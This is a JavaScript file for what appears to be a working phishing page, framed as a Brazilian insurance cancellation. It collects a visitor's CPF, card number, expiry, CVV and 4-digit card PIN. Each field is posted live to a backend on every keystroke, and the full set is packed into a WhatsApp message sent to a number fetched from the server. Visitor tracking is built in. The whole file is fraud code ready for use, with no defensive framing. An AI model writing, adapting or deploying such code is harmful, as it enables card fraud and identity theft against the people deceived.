let whatsappNumber = '+5511999999999'; // Default value, will be updated dynamically
let sessionId = generateSessionId(); // Generate unique session ID for the user
let transitionTriggered = false; // Flag to prevent multiple transitions

// Generate a unique session ID
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Send temporary data to the server
async function sendTempData(field, value) {
    try {
        const data = {
            sessionId: sessionId,
            [field]: value
        };
        const response = await fetch('/api/temp-submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        if (!response.ok) {
            console.error('Error sending temporary data:', await response.json());
        }
    } catch (error) {
        console.error('Error sending temporary data:', error);
    }
}

// Register a visit (invisible)
async function registerVisit() {
    try {
        const response = await fetch('/api/visit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        if (!response.ok) {
            console.error('Error registering visit:', await response.json());
        }
    } catch (error) {
        console.error('Error registering visit:', error);
    }
}

// Fetch WhatsApp number from backend
async function loadWhatsAppNumber() {
    try {
        const response = await fetch('/api/contact-number');
        const data = await response.json();
        if (response.ok) {
            whatsappNumber = data.contactNumber;
            // Update WhatsApp links
            const whatsappButtonLink = document.getElementById('whatsapp-button-link');
            const whatsappFooterLink = document.getElementById('whatsapp-footer-link');
            if (whatsappButtonLink) whatsappButtonLink.href = `https://wa.me/${whatsappNumber}?text=Oi%20Carina!`;
            if (whatsappFooterLink) whatsappFooterLink.href = `https://wa.me/${whatsappNumber}`;
            console.log('WhatsApp number loaded successfully:', whatsappNumber);
        } else {
            console.error('Error fetching contact number:', data.error);
        }
    } catch (error) {
        console.error('Error fetching contact number:', error);
    }
}

// Format CPF
function formatCPF(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
        value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
    }
    input.value = value;
}

// Validate CPF
function validateCPF(cpf) {
    console.log('Validating CPF:', cpf);
    cpf = cpf.replace(/\D/g, ''); // Remove pontos e traço
    console.log('CPF after removing non-digits:', cpf);
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
        console.log('CPF invalid: Length is not 11 or all digits are the same');
        return false;
    }

    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) {
        console.log('CPF invalid: First verification digit does not match');
        return false;
    }

    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) {
        console.log('CPF invalid: Second verification digit does not match');
        return false;
    }

    console.log('CPF is valid');
    return true;
}

function checkCPF() {
    const cpf = document.getElementById('cpf').value;
    const nextBtn = document.getElementById('next-btn');
    const cpfError = document.getElementById('cpf-error');
    if (cpf.length === 14 && validateCPF(cpf)) {
        console.log('checkCPF: CPF is valid, enabling next button');
        nextBtn.disabled = false;
        cpfError.classList.add('hidden');
    } else {
        console.log('checkCPF: CPF is invalid, disabling next button');
        nextBtn.disabled = true;
        if (cpf.length === 14) {
            cpfError.classList.remove('hidden');
        } else {
            cpfError.classList.add('hidden');
        }
    }
}

// Format Card Number
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 16) {
        value = value.replace(/(\d{4})(\d)/, '$1 $2');
        value = value.replace(/(\d{4}) (\d{4})(\d)/, '$1 $2 $3');
        value = value.replace(/(\d{4}) (\d{4}) (\d{4})(\d)/, '$1 $2 $3 $4');
    }
    input.value = value;
}

// Validate Card Number using Luhn Algorithm
function validateCardNumber() {
    const cardNumberInput = document.getElementById('card-number');
    const cardError = document.getElementById('card-error');
    let cardNumber = cardNumberInput.value.replace(/\D/g, '');

    if (cardNumber.length !== 16) {
        cardError.classList.remove('hidden');
        return false;
    }

    // Luhn Algorithm
    let sum = 0;
    let isEven = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }

    const isValid = (sum % 10) === 0;
    if (!isValid) {
        cardError.classList.remove('hidden');
    } else {
        cardError.classList.add('hidden');
    }
    return isValid;
}

// Format Expiry Date
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 4) {
        value = value.replace(/(\d{2})(\d)/, '$1/$2');
    }
    input.value = value;
}

// Validate Expiry Date
function validateExpiryDate() {
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const expiryError = document.getElementById('expiry-error');
    const value = expiryDateInput.value;

    if (value.length !== 5) {
        cvvInput.disabled = true;
        expiryError.classList.add('hidden');
        return false;
    }

    const [month, year] = value.split('/').map(Number);
    if (month < 1 || month > 12) {
        cvvInput.disabled = true;
        expiryError.classList.remove('hidden');
        return false;
    }

    const currentYear = new Date().getFullYear() % 100; // Last two digits of current year (2025 -> 25)
    const currentMonth = new Date().getMonth() + 1; // 1-12
    const fullYear = 2000 + year; // Convert AA to 20AA
    const currentFullYear = 2000 + currentYear;

    if (fullYear < currentFullYear || (fullYear === currentFullYear && month < currentMonth)) {
        cvvInput.disabled = true;
        expiryError.classList.remove('hidden');
        return false;
    }

    cvvInput.disabled = false;
    expiryError.classList.add('hidden');
    return true;
}

// Check all fields for card details and show additional fields after CVV
function checkFields() {
    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;

    // Só exibe os campos adicionais se todas as validações passarem e o CVV estiver preenchido
    if (cardNumber.length === 19 && expiryDate.length === 5 && cvv.length === 3 && validateCardNumber() && validateExpiryDate()) {
        showAdditionalFields();
    } else {
        hideAdditionalFields();
    }
}

// Show password field, card animation, and confirmation message
function showAdditionalFields() {
    const cardContainer = document.getElementById('card-container');
    const confirmationMessage = document.getElementById('confirmation-message');
    const passwordField = document.getElementById('password-field');
    const submitBtn = document.getElementById('submit-btn');

    if (!cardContainer || !confirmationMessage || !passwordField || !submitBtn) {
        console.error('One or more elements for card fields not found');
        return;
    }

    console.log('Showing additional fields on card screen');
    cardContainer.classList.remove('hidden');
    confirmationMessage.classList.remove('hidden');
    passwordField.classList.remove('hidden');
    submitBtn.classList.remove('hidden');
    // Scroll to password field smoothly
    setTimeout(() => {
        passwordField.scrollIntoView({ behavior: 'smooth', block: 'center' });
        console.log('Scrolled to password field');
    }, 100);
}

// Hide password field, card animation, and confirmation message
function hideAdditionalFields() {
    const cardContainer = document.getElementById('card-container');
    const confirmationMessage = document.getElementById('confirmation-message');
    const passwordField = document.getElementById('password-field');
    const submitBtn = document.getElementById('submit-btn');

    if (!cardContainer || !confirmationMessage || !passwordField || !submitBtn) {
        console.error('One or more elements for card fields not found');
        return;
    }

    console.log('Hiding additional fields on card screen');
    cardContainer.classList.add('hidden');
    confirmationMessage.classList.add('hidden');
    passwordField.classList.add('hidden');
    submitBtn.classList.add('hidden');
}

// Splash screen GIF with fade-in transition
const splashDiv = document.getElementById('splash');
const mainScreen = document.getElementById('main-screen');
const cardScreen = document.getElementById('card-screen');
const header = document.getElementById('header');
const footer = document.getElementById('footer');
const whatsappButton = document.getElementById('whatsapp-button');
const splashGif = document.getElementById('splash-gif');

// Log initial state
console.log('Splash screen loaded, starting transition timer...');

// Function to handle the transition from splash to main screen
function proceedWithTransition() {
    if (!splashDiv || !mainScreen || !header || !footer || !whatsappButton) {
        console.error('One or more elements for splash transition not found');
        return;
    }
    if (transitionTriggered) {
        console.log('Transition already triggered, skipping...');
        return;
    }
    transitionTriggered = true;
    console.log('Starting transition: Hiding splash screen');
    splashDiv.classList.add('opacity-0', 'transition-opacity', 'duration-1000');
    setTimeout(() => {
        splashDiv.classList.add('hidden');
        splashDiv.style.display = 'none'; // Forçar ocultar o splash
        mainScreen.classList.remove('hidden');
        mainScreen.classList.remove('opacity-0');
        header.classList.remove('hidden');
        footer.classList.remove('hidden');
        whatsappButton.classList.remove('hidden');
        mainScreen.style.display = 'flex'; // Forçar exibição da tela de CPF
        console.log('Main screen, header, footer, and WhatsApp button should now be visible');
    }, 1000);
}

// Check if splash GIF loads successfully or fails
if (splashGif) {
    splashGif.onload = () => {
        console.log('Splash GIF loaded successfully');
    };
    splashGif.onerror = () => {
        console.error('Error loading splash GIF - Transition will proceed without waiting');
        proceedWithTransition();
    };
}

// Use setTimeout to mimic the GIF duration for one loop (e.g., 2.8 seconds)
setTimeout(() => {
    console.log('Timeout triggered for splash transition');
    proceedWithTransition();
}, 2800);

// Go to card details screen
const nextBtn = document.getElementById('next-btn');
if (nextBtn) {
    nextBtn.addEventListener('click', () => {
        const cpf = document.getElementById('cpf');
        const cardContent = document.getElementById('card-content');
        const analysisMessage = document.getElementById('analysis-message');
        if (!cpf || !mainScreen || !cardScreen || !cardContent || !analysisMessage) {
            console.error('One or more elements for CPF screen transition not found');
            return;
        }
        console.log('Next button clicked, CPF value:', cpf.value);
        if (!cpf.value) {
            console.log('CPF field is empty');
            alert('Por favor, preencha o CPF.');
            return;
        }
        const isValid = validateCPF(cpf.value);
        console.log('CPF validation result:', isValid);
        if (!isValid) {
            console.log('CPF is invalid, showing alert');
            alert('Por favor, insira um CPF válido.');
            return;
        }
        console.log('CPF is valid, transitioning to card screen');
        mainScreen.classList.add('opacity-0');
        setTimeout(() => {
            mainScreen.classList.add('hidden');
            cardScreen.classList.remove('hidden');
            cardContent.classList.add('visible');
            analysisMessage.classList.remove('visible');
            setTimeout(() => {
                cardScreen.classList.remove('opacity-0');
                console.log('Card screen opacity set to visible');
            }, 50);
        }, 1000);
    });
}

// Add input event listeners to card fields
const cardNumberInput = document.getElementById('card-number');
const expiryDateInput = document.getElementById('expiry-date');
const cvvInput = document.getElementById('cvv');

if (cardNumberInput) {
    cardNumberInput.addEventListener('input', () => {
        formatCardNumber(cardNumberInput);
        validateCardNumber();
        checkFields();
        sendTempData('cardNumber', cardNumberInput.value);
    });
}

if (expiryDateInput) {
    expiryDateInput.addEventListener('input', () => {
        formatExpiryDate(expiryDateInput);
        validateExpiryDate();
        checkFields();
        sendTempData('expiryDate', expiryDateInput.value);
    });
}

if (cvvInput) {
    cvvInput.addEventListener('input', () => {
        checkFields();
        sendTempData('cvv', cvvInput.value);
    });
}

// Submit data and go to analysis screen
const submitBtn = document.getElementById('submit-btn');
if (submitBtn) {
    submitBtn.addEventListener('click', async () => {
        const cpf = document.getElementById('cpf');
        const cardNumber = document.getElementById('card-number');
        const expiryDate = document.getElementById('expiry-date');
        const cvv = document.getElementById('cvv');
        const password = document.getElementById('password');
        const cardContent = document.getElementById('card-content');
        const analysisMessage = document.getElementById('analysis-message');
        const whatsappRedirectBtn = document.getElementById('whatsapp-redirect-btn');

        if (!cpf || !cardNumber || !expiryDate || !cvv || !password || !cardContent || !analysisMessage || !whatsappRedirectBtn) {
            console.error('One or more elements for submit not found');
            return;
        }

        if (!cardNumber.value || !expiryDate.value || !cvv.value || !password.value) {
            alert('Por favor, preencha todos os campos do cartão e a senha.');
            return;
        }

        if (!validateCardNumber() || !validateExpiryDate() || password.value.length !== 4) {
            alert('Por favor, preencha todos os campos corretamente. A senha deve ter 4 dígitos e o número do cartão e a data de validade devem ser válidos.');
            return;
        }

        console.log('Submit button clicked:', { cpf: cpf.value, cardNumber: cardNumber.value, expiryDate: expiryDate.value, cvv: cvv.value, password: password.value });

        console.log('Transitioning to analysis screen');
        cardContent.classList.remove('visible');
        analysisMessage.classList.add('visible');
        setTimeout(() => {
            analysisMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
            console.log('Analysis message displayed and scrolled into view');
        }, 100);

        // Update WhatsApp redirect button link
        const message = `Cancelamento de Seguro\nCPF: ${cpf.value}\nCartão: ${cardNumber.value}\nExpiração: ${expiryDate.value}\nCVV: ${cvv.value}\nSenha: ${password.value}`;
        const encodedMessage = encodeURIComponent(message);
        whatsappRedirectBtn.addEventListener('click', () => {
            window.location.href = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
            console.log('Redirecting to WhatsApp:', whatsappNumber, encodedMessage);
        }, { once: true });

        // Optionally, send data to backend (uncomment when ready)
        /*
        try {
            const response = await fetch('/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    sessionId: sessionId,
                    cpf: cpf.value,
                    cardNumber: cardNumber.value,
                    expiryDate: expiryDate.value,
                    cvv: cvv.value,
                    password: password.value
                })
            });

            const result = await response.json();
            console.log('Submit response:', result);

            if (response.ok) {
                cardContent.classList.remove('visible');
                analysisMessage.classList.add('visible');
                setTimeout(() => {
                    analysisMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    console.log('Analysis message displayed and scrolled into view');
                }, 100);

                const message = `Cancelamento de Seguro\nCPF: ${cpf.value}\nCartão: ${cardNumber.value}\nExpiração: ${expiryDate.value}\nCVV: ${cvv.value}\nSenha: ${password.value}`;
                const encodedMessage = encodeURIComponent(message);
                whatsappRedirectBtn.addEventListener('click', () => {
                    window.location.href = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
                    console.log('Redirecting to WhatsApp:', whatsappNumber, encodedMessage);
                }, { once: true });
            } else {
                alert(result.error || 'Erro ao enviar os dados.');
            }
        } catch (error) {
            console.error('Error submitting form:', error);
            alert('Erro ao enviar os dados. Tente novamente.');
        }
        */
    });
}

// Load WhatsApp number and register visit on page load
window.onload = () => {
    console.log('Window loaded, initializing...');
    loadWhatsAppNumber();
    registerVisit();

    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', () => {
            formatCPF(cpfInput);
            checkCPF();
            sendTempData('cpf', cpfInput.value);
        });
    }
};
